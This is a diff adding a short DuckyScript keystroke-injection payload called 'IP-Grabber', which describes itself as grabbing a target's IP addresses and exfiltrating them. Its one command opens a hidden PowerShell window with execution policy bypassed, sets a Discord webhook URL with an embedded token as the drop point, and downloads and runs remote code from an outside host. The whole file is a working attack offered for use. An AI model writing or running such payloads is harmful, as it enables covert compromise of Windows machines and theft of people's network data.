@@ -1,0 +1,12 @@
+REM     Title: IP-Grabber
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload is meant to do grab your targets IP addresses and exfil them
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discordapp.com/api/webhooks/1127032133475635291/EDVF6KmHSGm47HF9qbwxCet8kHjRsYg9Pu8QDnM2tLBqtb4bevlYeZLq4mx5kHStWJWw';$db='';irm jakoby.lol/f0x | iex
+ENTER
